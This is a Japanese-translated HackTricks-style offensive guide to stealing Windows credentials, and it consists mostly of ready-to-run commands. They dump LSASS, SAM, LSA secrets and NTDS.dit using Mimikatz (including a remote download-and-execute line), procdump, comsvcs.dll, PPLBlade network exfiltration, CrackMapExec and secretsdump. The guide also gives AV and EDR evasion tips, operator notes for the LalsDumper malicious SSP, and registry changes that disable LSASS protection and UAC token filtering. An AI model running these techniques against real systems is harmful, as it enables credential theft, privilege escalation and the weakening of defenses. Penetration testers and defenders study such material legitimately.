# Windows Credentials の窃取

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatzができるその他のことは** [**this page**](credentials-mimikatz.md)**で確認してください。**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**ここでいくつかの可能な credentials protections について学んでください。**](credentials-protections.md) **これらの protections は Mimikatz が一部の credentials を抽出するのを防ぐ可能性があります。**

## Credentials with Meterpreter

[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **私が作成した** を使用して、被害者内で **passwords and hashes を検索する**。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AVのバイパス

### Procdump + Mimikatz

**Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**は正規の Microsoft ツールであるため、Defenderに検出されません。\
このツールを使用して **dump the lsass process**、**download the dump** し、ダンプから **extract** して **credentials locally** を取り出すことができます。

また[SharpDump](https://github.com/GhostPack/SharpDump)を使用することもできます。
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
このプロセスは [SprayKatz](https://github.com/aas-n/spraykatz) で自動的に行われます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注**: 一部の **AV** は **procdump.exe to dump lsass.exe** の使用を **malicious** と **detect** する場合があります。これは彼らが **"procdump.exe" and "lsass.exe"** という文字列を検出しているためです。したがって、**lsass.exe** という **name** を渡す代わりに、lsass.exe の **PID** を **argument** として procdump に **pass** する方が **stealthier** です。

### **comsvcs.dll** を使った lsass のダンプ

`C:\Windows\System32` にある **comsvcs.dll** という DLL は、クラッシュ時に **プロセスのメモリをダンプする** 役割を担っています。この DLL には `rundll32.exe` から呼び出すことを想定した **`MiniDumpW`** という **function** が含まれています。\
最初の2つの引数を使うかどうかは重要ではありませんが、3番目の引数は3つのコンポーネントに分かれます。ダンプ対象のプロセス ID が第1のコンポーネント、ダンプファイルの場所が第2のコンポーネントで、3番目のコンポーネントは厳密に単語 **full** です。代替のオプションは存在しません。\
これら3つのコンポーネントを解析すると、DLL はダンプファイルの作成を行い、指定したプロセスのメモリをそのファイルへ転送します。\
**comsvcs.dll** を利用すれば lsass プロセスをダンプできるため、procdump をアップロードして実行する必要がなくなります。この手法の詳細は [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/) に記載されています。

実行に使用するコマンドは次のとおりです：
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**このプロセスは** [**lsassy**](https://github.com/Hackndo/lsassy)**で自動化できます。**

### **Task Manager を使った lsass のダンプ**

1. タスクバーを右クリックして Task Manager をクリックします
2. 「More details」をクリックします
3. Processes タブで "Local Security Authority Process" プロセスを検索します
4. "Local Security Authority Process" プロセスを右クリックし、"Create dump file" をクリックします。

### procdump を使った lsass のダンプ

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) は Microsoft によって署名されたバイナリで、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/) スイートの一部です。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBladeを使ってlsassをダンプする

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) は、Protected Process Dumper Toolで、メモリダンプを難読化し、ディスクに書き込むことなくリモートワークステーションへ転送することをサポートします。

**主な機能**:

1. PPL保護のバイパス
2. Defenderのシグネチャベースの検出を回避するためのメモリダンプファイルの難読化
3. RAWおよびSMBアップロード方式でメモリダンプをディスクに書き込むことなくアップロード（fileless dump）
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSPベースのLSASSダンプ（MiniDumpWriteDumpを使用しない）

Ink DragonはLalsDumperという3段階のダンパーを同梱しており、MiniDumpWriteDumpを呼び出さないため、EDRの当該APIに対するフックは発動しません:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll`内で32個の小文字の`d`からなるプレースホルダを検索し、それを`rtu.txt`への絶対パスで上書きして、パッチ済みのDLLを`nfdp.dll`として保存し、`AddSecurityPackageA("nfdp","fdp")`を呼び出します。これにより**LSASS**は悪意のあるDLLを新しいSecurity Support Provider (SSP)としてロードします。
2. **Stage 2 inside LSASS** – LSASSが`nfdp.dll`をロードすると、DLLは`rtu.txt`を読み取り、各バイトを`0x20`でXORしてデコードしたブロブをメモリにマップし、実行を移します。
3. **Stage 3 dumper** – マップされたペイロードは、ハッシュ化されたAPI名から解決した**direct syscalls**を用いてMiniDumpロジックを再実装します（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）。`Tom`という専用のエクスポートが`%TEMP%\<pid>.ddt`を開き、圧縮されたLSASSダンプをファイルにストリームしてハンドルを閉じ、後でexfiltrationできます。

Operator notes:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, および `rtu.txt` を同じディレクトリに置いてください。Stage 1はハードコードされたプレースホルダを`rtu.txt`の絶対パスで書き換えるため、分割するとチェーンが途切れます。
* 登録は `nfdp` を `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` に追加することで行われます。自分でその値を設定すれば、LSASSは毎回ブート時にSSPをリロードします。
* `%TEMP%\*.ddt` ファイルは圧縮されたダンプです。ローカルで解凍してからMimikatz/Volatilityに渡して資格情報を抽出してください。
* `lals.exe` の実行には admin/SeTcb 権限が必要で、`AddSecurityPackageA` が成功します。コールが返ると、LSASSは透過的に不正なSSPをロードして Stage 2 を実行します。
* ディスクからDLLを削除してもLSASSからは排除されません。レジストリエントリを削除してLSASSを再起動（再起動）するか、長期的な永続化のためにそのまま残してください。

## CrackMapExec

### SAMハッシュのダンプ
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### target DC から NTDS.dit を Dump
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### ターゲット DC から NTDS.dit のパスワード履歴を Dump
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 各 NTDS.dit アカウントの pwdLastSet 属性を表示する
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM & SYSTEM の窃取

これらのファイルは _C:\windows\system32\config\SAM_ および _C:\windows\system32\config\SYSTEM._ に**配置されています**。しかし、**通常の方法で単純にコピーすることはできません**。保護されているためです。

### From Registry

これらのファイルを窃取する最も簡単な方法は、Registry からコピーを取得することです：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
それらのファイルをあなたの Kali マシンに**ダウンロード**し、次のコマンドで**hashes を抽出**します:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

このサービスを使用して保護されたファイルのコピーを取得できます。Administrator 権限が必要です。

#### Using vssadmin

vssadmin バイナリは Windows Server のバージョンでのみ利用可能です
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
しかし、**Powershell** から同じことができます。これは **SAM file をコピーする方法** の例です（使用されるハードドライブは "C:"、保存先は C:\users\Public）が、任意の保護されたファイルをコピーするためにも使用できます：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
書籍からのコード: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

最後に、[**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) を使用して SAM、SYSTEM、および ntds.dit のコピーを作成することもできます。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory 資格情報 - NTDS.dit**

The **NTDS.dit** file は **Active Directory** の中心部として知られており、ユーザーオブジェクト、グループ、およびそれらのメンバーシップに関する重要なデータを保持します。ドメインユーザーの **password hashes** が保存されている場所です。このファイルは **Extensible Storage Engine (ESE)** データベースで、**_%SystemRoom%/NTDS/ntds.dit_** に配置されています。

このデータベース内には、主に3つのテーブルが保持されています:

- **Data Table**: このテーブルはユーザーやグループなどのオブジェクトに関する詳細を格納します。
- **Link Table**: グループメンバーシップなどの関係を追跡します。
- **SD Table**: 各オブジェクトの **Security descriptors** がここに格納され、保存されたオブジェクトのセキュリティとアクセス制御が確保されます。

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. そのため、**NTDS.dit** ファイルの一部は **`lsass`** のメモリ内に存在することがあり（キャッシュによる性能改善のため、直近アクセスされたデータが見つかる可能性があります）、最新にアクセスされたデータを見つけられることがあります。

#### NTDS.dit 内のハッシュの復号

ハッシュは3段階で暗号化されています:

1. Password Encryption Key (**PEK**) を **BOOTKEY** と **RC4** を使って復号します。
2. 次に **PEK** と **RC4** を使ってその **hash** を復号します。
3. 最後に **DES** を使って **hash** を復号します。

**PEK** は **すべてのドメインコントローラーで同じ値** を持ちますが、各ドメインコントローラーごとに異なる **SYSTEM** ファイルの **BOOTKEY** を使って **NTDS.dit** ファイル内で **暗号化** されています（ドメインコントローラー間で異なります）。このため、NTDS.dit から資格情報を取得するには **NTDS.dit と SYSTEM** のファイルが必要です（_C:\Windows\System32\config\SYSTEM_）。

### Ntdsutil を使った NTDS.dit のコピー

Windows Server 2008 から利用可能です。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
また、[**volume shadow copy**](#stealing-sam-and-system) トリックを使って **ntds.dit** ファイルをコピーすることもできます。**SYSTEM file** のコピーも必要になることを忘れないでください（繰り返しますが、[**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) トリックを使って取得してください）。

### **NTDS.dit から hashes を抽出する**

NTDS.dit と SYSTEM ファイルを取得したら、_secretsdump.py_ のようなツールを使用して **extract the hashes** できます：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
また、有効な domain admin user を使用して、**それらを自動的に抽出**できます:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
For **大きな NTDS.dit ファイル** は [gosecretsdump](https://github.com/c-sto/gosecretsdump) を使って抽出することを推奨します。

最後に、**metasploit module**: _post/windows/gather/credentials/domain_hashdump_ または **mimikatz** `lsadump::lsa /inject` を使用することもできます。

### **NTDS.dit からドメインオブジェクトを SQLite データベースに抽出する**

NTDS オブジェクトは [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) を使って SQLite データベースに抽出できます。raw NTDS.dit ファイルを既に取得している場合、secrets だけでなくオブジェクト全体とその属性も抽出され、さらなる情報抽出に利用できます。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive はオプションですが、秘密情報の復号化を可能にします（NT & LM hashes、supplemental credentials（cleartext passwords など）、kerberos や trust keys、NT & LM password histories）。Along with other information, the following data is extracted : user and machine accounts with their hashes、UAC flags、timestamp for last logon and password change、accounts description、names、UPN、SPN、groups and recursive memberships、organizational units tree and membership、trusted domains with trusts type、direction and attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). このバイナリを使用して、複数のソフトウェアから credentials を抽出できます。
```
lazagne.exe all
```
## SAM と LSASS から資格情報を抽出するその他のツール

### Windows credentials Editor (WCE)

このツールはメモリから資格情報を抽出するために使用できます。Download it from: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM ファイルから資格情報を抽出する
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAMファイルから資格情報を抽出する
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

ダウンロード先:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7)。**実行するだけで**パスワードが抽出されます。

## アイドル状態のRDPセッションの収集とセキュリティ制御の弱体化

Ink Dragon の FinalDraft RAT には `DumpRDPHistory` タスカーが含まれており、その手法はどの red-teamer にとっても便利です:

### DumpRDPHistory スタイルのテレメトリ収集

* **Outbound RDP targets** – 各ユーザーハイブを `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` から解析します。各サブキーはサーバー名、`UsernameHint`、および最終書き込みタイムスタンプを保存します。FinalDraft のロジックは PowerShell で再現できます:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` ログを Event ID **21**（成功したログオン）と **25**（切断）でクエリし、誰がホストを管理していたかをマップします:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

どの Domain Admin が定期的に接続しているかがわかったら、彼らの **切断された** セッションがまだ存在している間に LSASS（LalsDumper/Mimikatz を使用）をダンプします。CredSSP + NTLM フォールバックは彼らの verifier と tokens を LSASS に残し、それらは SMB/WinRM 経由でリプレイされて `NTDS.dit` を取得したり、ドメインコントローラ上で永続化を仕込むために使われます。

### Registry downgrades targeted by FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` を設定すると、RDP 中に完全な資格情報/チケットの再利用が強制され、pass-the-hash スタイルのピボットを可能にします。
* `LocalAccountTokenFilterPolicy=1` は UAC のトークンフィルタリングを無効にし、local admins がネットワーク経由で制限のないトークンを取得できるようにします。
* `DSRMAdminLogonBehavior=2` は DC がオンラインの間に DSRM 管理者のログオンを許可し、攻撃者にもう1つの組み込みの高権限アカウントを与えます。
* `RunAsPPL=0` は LSASS PPL の保護を解除し、LalsDumper のようなダンプツールによるメモリアクセスを容易にします。

## 参考文献

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
